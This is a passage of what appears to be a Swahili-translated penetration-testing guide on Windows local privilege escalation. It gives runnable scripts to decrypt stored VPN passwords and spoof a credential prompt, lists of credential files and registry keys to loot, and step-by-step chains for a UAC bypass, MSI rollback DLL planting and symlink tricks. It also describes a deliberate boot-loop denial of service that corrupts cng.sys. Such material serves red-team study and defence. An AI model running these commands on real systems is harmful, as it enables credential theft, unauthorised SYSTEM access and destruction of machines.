Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Logs
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Uliza kwa vitambulisho

Unaweza daima **kumwomba mtumiaji aingize vitambulisho vyake au hata vitambulisho vya mtumiaji tofauti** ikiwa unafikiri anaweza kuvijua (kumbuka kwamba **kuomba** mteja moja kwa moja **vitambulisho** ni jambo **hatari** sana):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Majina ya faili yanayowezekana yenye credentials**

Faili zinazojulikana ambazo wakati fulani hapo awali zilikuwa na **passwords** kwa **clear-text** au **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Tafadhali toa faili zinazopaswa kutafutwa.
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Credentials katika RecycleBin

Unapaswa pia kuangalia Bin ili kutafuta credentials zilizo ndani yake

Ili **kurecover passwords** zilizohifadhiwa na programu kadhaa unaweza kutumia: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Ndani ya registry

**Key nyingine zinazowezekana za registry zenye credentials**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Toa funguo za openssh kutoka registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Historia ya Browsers

Unapaswa kuangalia dbs ambapo passwords kutoka **Chrome au Firefox** huhifadhiwa.\
Pia angalia historia, bookmarks na favourites za browsers ili huenda baadhi ya **passwords ziko** hapo.

Tools za kutoa passwords kutoka browsers:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** ni teknolojia iliyojengwa ndani ya mfumo wa uendeshaji wa Windows inayoruhusu **intercommunication** kati ya software components za lugha tofauti. Kila COM component hutambulishwa kupitia **class ID (CLSID)** na kila component hutoa functionality kupitia interface moja au zaidi, zinazotambulishwa kupitia interface IDs (IIDs).

COM classes na interfaces hufafanuliwa kwenye registry chini ya **HKEY\CLASSES\ROOT\CLSID** na **HKEY\CLASSES\ROOT\Interface** mtawalia. Registry hii huundwa kwa kuunganisha **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Ndani ya CLSIDs za registry hii unaweza kupata child registry **InProcServer32** ambayo ina **default value** inayoelekeza kwenye **DLL** na value inayoitwa **ThreadingModel** ambayo inaweza kuwa **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) au **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

Kimsingi, ukiweza **kuoverwrite any of the DLLs** ambazo zitaendeshwa, unaweza **kupanua privileges** ikiwa DLL hiyo itaendeshwa na user tofauti.

Ili kujifunza jinsi attackers wanavyotumia COM Hijacking kama mechanism ya persistence angalia:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Generic Password search in files and registry**

**Tafuta contents za file**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Tafuta faili lenye jina fulani**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Tafuta registry kwa majina ya keys na passwords**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Zana za kutafuta nywila

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** plugin nimeunda plugin hii ili **kiotomatiki iendeshe kila metasploit POST module inayotafuta credentials** ndani ya victim.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) kiotomatiki hutafuta faili zote zilizo na passwords zilizotajwa kwenye ukurasa huu.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) ni tool nyingine nzuri ya kutoa password kutoka kwenye system.

Tool [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) hutafuta **sessions**, **usernames** na **passwords** za tools kadhaa zinazohifadhi data hii kwa clear text (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Fikiria kwamba **process inayoendeshwa kama SYSTEM ifungue process mpya** (`OpenProcess()`) **ikiwa na full access**. Process hiyo hiyo pia **iunde process mpya** (`CreateProcess()`) **ikiwa na low privileges lakini ikirithi open handles zote za process kuu**.\
Kisha, ikiwa una **full access kwa process ya low privileged**, unaweza kuchukua **open handle kwa process yenye privileges iliyoundwa** na `OpenProcess()` na **kudunga shellcode**.\
[Somma mfano huu kwa maelezo zaidi kuhusu **jinsi ya kugundua na kutumia udhaifu huu**.](leaked-handle-exploitation.md)\
[Somma **chapisho hili jingine kwa maelezo ya kina zaidi kuhusu jinsi ya kujaribu na kutumia vibaya open handlers zaidi za processes na threads zilizoandaliwa na viwango tofauti vya permissions (siyo full access pekee)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Sehemu za shared memory, zinazojulikana kama **pipes**, huwezesha mawasiliano ya process na uhamisho wa data.

Windows hutoa feature inayoitwa **Named Pipes**, inayoruhusu processes zisizohusiana kushiriki data, hata kwenye mitandao tofauti. Hii inafanana na client/server architecture, ikiwa na roles zinazofafanuliwa kama **named pipe server** na **named pipe client**.

Wakati data inatumwa kupitia pipe na **client**, **server** iliyoweka pipe inaweza **kujifananisha na identity** ya **client**, ikizingatiwa ina **SeImpersonate** rights zinazohitajika. Kutambua **privileged process** inayowasiliana kupitia pipe unayoweza kuiiga kunatoa fursa ya **kupata higher privileges** kwa kuchukua identity ya process hiyo mara tu inapoingiliana na pipe uliyoset. Kwa maelekezo ya kutekeleza shambulio kama hilo, guides zenye msaada zinaweza kupatikana [**hapa**](named-pipe-client-impersonation.md) na [**hapa**](#from-high-integrity-to-system).

Pia tool ifuatayo inaruhusu **kuintercept mawasiliano ya named pipe kwa tool kama burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **na tool hii inaruhusu kuorodhesha na kuona pipes zote ili kupata privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Telephony service (TapiSrv) katika mode ya server hufichua `\\pipe\\tapsrv` (MS-TRP). Remote authenticated client anaweza kutumia vibaya mailslot-based async event path ili kubadili `ClientAttach` kuwa **4-byte write** ya kiholela kwenye file yoyote iliyopo inayoweza kuandikwa na `NETWORK SERVICE`, kisha apate Telephony admin rights na apakie DLL ya kiholela kama service. Mlolongo kamili:

- `ClientAttach` ikiwa na `pszDomainUser` imewekwa kwenye existing path inayoweza kuandikwa → service huifungua kupitia `CreateFileW(..., OPEN_EXISTING)` na kuitumia kwa async event writes.
- Kila event huandika `InitContext` inayodhibitiwa na attacker kutoka `Initialize` kwenye handle hiyo. Sajili line app kwa `LRegisterRequestRecipient` (`Req_Func 61`), chochea `TRequestMakeCall` (`Req_Func 121`), pata kupitia `GetAsyncEvents` (`Req_Func 0`), kisha ondoa usajili/shutdown kurudia deterministic writes.
- Ongeza jina lako kwenye `[TapiAdministrators]` katika `C:\Windows\TAPI\tsec.ini`, reconnect, kisha ita `GetUIDllName` na DLL path ya kiholela ili kutekeleza `TSPI_providerUIIdentify` kama `NETWORK SERVICE`.

Maelezo zaidi:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### File Extensions that could execute stuff in Windows

Angalia ukurasa **[https://filesec.io/](https://filesec.io/)**

### Protocol handler / ShellExecute abuse via Markdown renderers

Clickable Markdown links zilizopelekwa kwa `ShellExecuteExW` zinaweza kuchochea dangerous URI handlers (`file:`, `ms-appinstaller:` au scheme yoyote iliyosajiliwa) na kutekeleza files zinazodhibitiwa na attacker kama current user. Tazama:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitoring Command Lines for passwords**

Unapopata shell kama user, huenda kuwe na scheduled tasks au processes nyingine zinazotekelezwa ambazo **hupitisha credentials kwenye command line**. Script hapa chini hukusanya process command lines kila baada ya sekunde mbili na kulinganisha hali ya sasa na ile ya awali, kisha kutoa tofauti zozote.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Kuiba nywila kutoka kwa processes

## Kutoka Low Priv User hadi NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Ikiwa una access ya graphical interface (kupitia console au RDP) na UAC imewezeshwa, katika baadhi ya versions za Microsoft Windows inawezekana kuendesha terminal au process nyingine yoyote kama "NT\AUTHORITY SYSTEM" kutoka kwa unprivileged user.

Hii hufanya iwezekane kuongeza privileges na bypass UAC kwa wakati mmoja kwa kutumia vulnerability ileile. Zaidi ya hayo, hakuna haja ya kusakinisha chochote na binary inayotumiwa wakati wa process, imesainiwa na kutolewa na Microsoft.

Baadhi ya systems zilizoathiriwa ni zifuatazo:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Ili kutumia vulnerability hii, ni lazima kutekeleza hatua zifuatazo:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388

## Kutoka Administrator Medium hadi High Integrity Level / UAC Bypass

Soma hili ili **kujifunza kuhusu Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Kisha **soma hili ili kujifunza kuhusu UAC na UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Kutoka Arbitrary Folder Delete/Move/Rename hadi SYSTEM EoP

Technique iliyofafanuliwa [**katika blog post hii**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) ikiwa na exploit code [**inayopatikana hapa**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

Attack kimsingi inajumuisha kutumia vibaya Windows Installer's rollback feature ili kubadilisha legitimate files na malicious ones wakati wa mchakato wa uninstallation. Kwa hili attacker anahitaji kuunda **malicious MSI installer** ambayo itatumika hijack folda ya `C:\Config.Msi`, ambayo baadaye itatumiwa na he Windows Installer kuhifadhi rollback files wakati wa uninstallation ya MSI packages nyingine ambapo rollback files zingekuwa zimebadilishwa kuwa na malicious payload.

Technique iliyofupishwa ni hii ifuatayo:

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- Unda `.msi` inayosakinisha file lisilo na madhara (mfano, `dummy.txt`) kwenye folda inayoweza kuandikwa (`TARGETDIR`).
- Weka installer kama **"UAC Compliant"**, ili **non-admin user** aweze kuiendesha.
- Acha **handle** ikiwa wazi kwa file baada ya install.

- Step 2: Begin Uninstall
- Ondoa usakinishaji wa `.msi` hiyo hiyo.
- Mchakato wa uninstall unaanza kuhamisha files kwenda `C:\Config.Msi` na kuzibadilisha majina kuwa files za `.rbf` (rollback backups).
- **Poll the open file handle** kwa kutumia `GetFinalPathNameByHandle` ili kugundua wakati file linakuwa `C:\Config.Msi\<random>.rbf`.

- Step 3: Custom Syncing
- `.msi` inajumuisha **custom uninstall action (`SyncOnRbfWritten`)** ambayo:
- Huashiria wakati `.rbf` imeandikwa.
- Kisha **inasubiri** kwenye event nyingine kabla ya kuendelea na uninstall.

- Step 4: Block Deletion of `.rbf`
- Wakati imeashiriwa, **fungua file la `.rbf`** bila `FILE_SHARE_DELETE` — hili **linazuia lifutwe**.
- Kisha **ashiria kurudi** ili uninstall iweze kukamilika.
- Windows Installer inashindwa kufuta `.rbf`, na kwa sababu haiwezi kufuta contents zote, **`C:\Config.Msi` haiondolewi**.

- Step 5: Manually Delete `.rbf`
- Wewe (attacker) unafuta file la `.rbf` manually.
- Sasa **`C:\Config.Msi` iko empty**, tayari kwa hijack.

> Kwa wakati huu, **trigger the SYSTEM-level arbitrary folder delete vulnerability** ili kufuta `C:\Config.Msi`.

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- Tengeneza tena folda ya `C:\Config.Msi` mwenyewe.
- Weka **weak DACLs** (mfano, Everyone:F), na **acha handle ikiwa wazi** yenye `WRITE_DAC`.

- Step 7: Run Another Install
- Sakinisha `.msi` tena, na:
- `TARGETDIR`: Eneo linaloweza kuandikwa.
- `ERROROUT`: Variable inayochochea forced failure.
- Install hii itatumika kuchochea **rollback** tena, ambayo husoma `.rbs` na `.rbf`.

- Step 8: Monitor for `.rbs`
- Tumia `ReadDirectoryChangesW` kufuatilia `C:\Config.Msi` hadi `.rbs` mpya itokee.
- Captcha filename yake.

- Step 9: Sync Before Rollback
- `.msi` ina **custom install action (`SyncBeforeRollback`)** ambayo:
- Huashiria event wakati `.rbs` imeundwa.
- Kisha **inasubiri** kabla ya kuendelea.

- Step 10: Reapply Weak ACL
- Baada ya kupokea event ya `.rbs created`:
- Windows Installer **inaweka tena strong ACLs** kwa `C:\Config.Msi`.
- Lakini kwa kuwa bado una handle yenye `WRITE_DAC`, unaweza **kuweka tena weak ACLs**.

> ACLs **zinatekelezwa tu wakati handle inafunguliwa**, hivyo bado unaweza kuandika kwenye folda.

- Step 11: Drop Fake `.rbs` and `.rbf`
- Andika upya file la `.rbs` kwa **fake rollback script** inayomwambia Windows:
- Rudisha file lako la `.rbf` (malicious DLL) kwenda kwenye **privileged location** (mfano, `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Dondosha fake `.rbf` yako yenye **malicious SYSTEM-level payload DLL**.

- Step 12: Trigger the Rollback
- Ashiria sync event ili installer iendelee.
- A **type 19 custom action (`ErrorOut`)** imewekwa ili **kushindwa kimakusudi** install katika point inayojulikana.
- Hii husababisha **rollback kuanza**.

- Step 13: SYSTEM Installs Your DLL
- Windows Installer:
- Husoma malicious `.rbs` yako.
- Huunakili DLL yako ya `.rbf` kwenda kwenye target location.
- Sasa una **malicious DLL yako katika SYSTEM-loaded path**.

- Final Step: Execute SYSTEM Code
- Endesha **auto-elevated binary** inayoaminika (mfano, `osk.exe`) inayopakia DLL uliyohijack.
- **Boom**: Code yako inaendeshwa **as SYSTEM**.


### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

Main MSI rollback technique (iliyotangulia) inadhani unaweza kufuta **folda nzima** (mfano, `C:\Config.Msi`). Lakini je, vulnerability yako inaruhusu tu **arbitrary file deletion** ?

Unaweza kutumia **NTFS internals**: kila folda ina hidden alternate data stream inayoitwa:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Utiririshaji huu huhifadhi **index metadata** ya folda.

Kwa hiyo, ukifuta **mtiririko wa `::$INDEX_ALLOCATION`** wa folda, NTFS **huondoa folda nzima** kutoka kwenye filesystem.

Unaweza kufanya hivi kwa kutumia standard file deletion APIs kama:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Hata kama unaita API ya kufuta *file*, **inafuta folda yenyewe**.

### Kutoka Kufuta Maudhui ya Folder hadi SYSTEM EoP
Je, ikiwa primitive yako hairuhusu kufuta files/folders za kiholela, lakini **inaruhusu kufuta *maudhui* ya folder inayodhibitiwa na mshambuliaji**?

1. Hatua ya 1: Sanidi bait folder na file
- Unda: `C:\temp\folder1`
- Ndani yake: `C:\temp\folder1\file1.txt`

2. Hatua ya 2: Weka **oplock** kwenye `file1.txt`
- Oplock **inasitisha utekelezaji** wakati process yenye privilege inapojaribu kufuta `file1.txt`.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Hatua ya 3: Chochea mchakato wa SYSTEM (mfano, `SilentCleanup`)
- Mchakato huu huchunguza folda (mfano, `%TEMP%`) na kujaribu kufuta yaliyomo yake.
- Unapofikia `file1.txt`, **oplock husababishwa** na kukabidhi udhibiti kwa callback yako.

4. Hatua ya 4: Ndani ya callback ya oplock – elekeza ufutaji upya

- Chaguo A: Hamisha `file1.txt` kwingine
- Hii huondoa yaliyomo ya `folder1` bila kuvunja oplock.
- Usifute `file1.txt` moja kwa moja — hilo lingeachilia oplock mapema sana.

- Chaguo B: Badilisha `folder1` kuwa **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Chaguo C: Unda **symlink** katika `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Hii inalenga NTFS internal stream ambayo huhifadhi metadata ya folda — kuifuta huifuta folda.

5. Hatua ya 5: Release the oplock
- Mchakato wa SYSTEM unaendelea na unajaribu kufuta `file1.txt`.
- Lakini sasa, kwa sababu ya junction + symlink, kwa kweli unafuta:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Matokeo**: `C:\Config.Msi` inafutwa na SYSTEM.

### Kutoka Kuunda Folda ya Kiholela hadi Permanent DoS

Tumia primitive inayokuruhusu **kuunda folda ya kiholela kama SYSTEM/admin** — hata kama **huwezi kuandika faili** au **kuweka ruhusa dhaifu**.

Unda **folda** (sio faili) yenye jina la **critical Windows driver**, mfano:
```
C:\Windows\System32\cng.sys
```
- Path hii kawaida inalingana na `cng.sys` kernel-mode driver.
- Ukii**pre-create** kama folder, Windows inashindwa kupakia driver halisi wakati wa boot.
- Kisha, Windows inajaribu kupakia `cng.sys` wakati wa boot.
- Inaona folder hiyo, **inashindwa kutatua driver halisi**, na **ina-crash au kusimamisha boot**.
- Hakuna **fallback**, na hakuna **recovery** bila kuingilia nje (mfano, boot repair au disk access).

### Kutoka privileged log/backup paths + OM symlinks hadi arbitrary file overwrite / boot DoS

Wakati **privileged service** inaandika logs/exports kwenda kwenye path inayosomwa kutoka kwa **writable config**, elekeza upya path hiyo kwa kutumia **Object Manager symlinks + NTFS mount points** ili kubadilisha privileged write kuwa arbitrary overwrite (hata **bila** SeCreateSymbolicLinkPrivilege).

**Mahitaji**
- Config inayohifadhi target path iwe writable kwa attacker (mfano, `%ProgramData%\...\.ini`).
- Uwezo wa kuunda mount point kwenda `\RPC Control` na OM file symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
- Operesheni yenye privilege inayowaandika kwenye path hiyo (log, export, report).

**Mfano wa chain**
1. Soma config ili kupata privileged log destination, mfano `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` katika `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Elekeza upya path bila admin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Subiri hadi sehemu yenye ruhusa iandike logi (mf. admin aanzishe "send test SMS"). Uandishi sasa unaingia kwenye `C:\Windows\System32\cng.sys`.
4. Kagua lengo lililofunikwa (hex/PE parser) ili kuthibitisha uharibifu; reboot hulazimisha Windows kupakia path ya dereva iliyoharibiwa → **boot loop DoS**. Hii pia hutumika kwa jumla kwa faili yoyote iliyolindwa ambayo huduma yenye ruhusa itafungua kwa ajili ya kuandika.

> `cng.sys` kwa kawaida hupakiwa kutoka `C:\Windows\System32\drivers\cng.sys`, lakini kama kuna nakala katika `C:\Windows\System32\cng.sys` inaweza kujaribiwa kwanza, hivyo kuifanya kuwa sinki la kuaminika la DoS kwa data iliyoharibika.



## **From High Integrity to System**

### **New service**

If you are already running on a High Integrity process, the **path to SYSTEM** can be easy just **creating and executing a new service**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Unapounda binary ya service hakikisha ni service halali au kwamba binary inafanya vitendo vinavyohitajika haraka kadri iwezekanavyo kwani itauawa baada ya 20s ikiwa si service halali.

### AlwaysInstallElevated

Kutoka kwa process ya High Integrity unaweza kujaribu **kuwasha entries za registry za AlwaysInstallElevated** na **kufunga** reverse shell kwa kutumia wrapper ya _**.msi**_.\
[Maelezo zaidi kuhusu registry keys zinazohusika na jinsi ya kufunga package ya _.msi_ hapa.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Unaweza** [**kupata code hapa**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Ukiwa na token privileges hizo (huenda utazipata kwenye process iliyoko tayari High Integrity), utaweza **kufungua karibu process yoyote** (zisizo protected processes) kwa privilege ya SeDebug, **kunakili token** ya process, na kuunda **arbitrary process kwa token hiyo**.\
Kwa kawaida technique hii **huchagua process yoyote inayoendeshwa kama SYSTEM yenye token privileges zote** (_ndiyo, unaweza kupata SYSTEM processes zisizo na token privileges zote_).\
**Unaweza kupata** [**mfano wa code unaotekeleza technique iliyopendekezwa hapa**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Technique hii hutumiwa na meterpreter kupandisha haki kwenye `getsystem`. Technique hii inajumuisha **kuunda pipe na kisha kuunda/kutumia vibaya service ili iandike kwenye pipe hiyo**. Kisha, **server** iliyounda pipe kwa kutumia privilege ya **`SeImpersonate`** itaweza **ku-impersonate token** ya client wa pipe (service) na kupata privileges za SYSTEM.\
Ukitaka [**kujifunza zaidi kuhusu name pipes unapaswa kusoma hiki**](#named-pipe-client-impersonation).\
Ukitaka kusoma mfano wa [**jinsi ya kutoka high integrity hadi System kwa kutumia name pipes unapaswa kusoma hiki**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Ukiweza **kudukua dll** inayokuwa **loaded** na **process** inayoendeshwa kama **SYSTEM** utaweza kutekeleza arbitrary code kwa permissions hizo. Kwa hiyo Dll Hijacking pia ni muhimu kwa aina hii ya privilege escalation, na zaidi ya hayo, ni **rahisi zaidi kuifanikisha kutoka kwenye high integrity process** kwa kuwa itakuwa na **write permissions** kwenye folda zinazotumiwa kupakia dlls.\
**Unaweza** [**kujifunza zaidi kuhusu Dll hijacking hapa**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Soma:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Chombo bora cha kutafuta Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Angalia misconfigurations na sensitive files (**[**angalia hapa**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Angalia baadhi ya possible misconfigurations na kukusanya info (**[**angalia hapa**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Angalia misconfigurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Hutoa taarifa za session zilizohifadhiwa za PuTTY, WinSCP, SuperPuTTY, FileZilla, na RDP. Tumia -Thorough kwenye local.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Hutoa crendentials kutoka Credential Manager. Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Tumia passwords zilizokusanywa kwenye domain nzima**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh ni PowerShell ADIDNS/LLMNR/mDNS spoofer na man-in-the-middle tool.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Basic privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Tafuta known privesc vulnerabilities (DEPRECATED for Watson)\
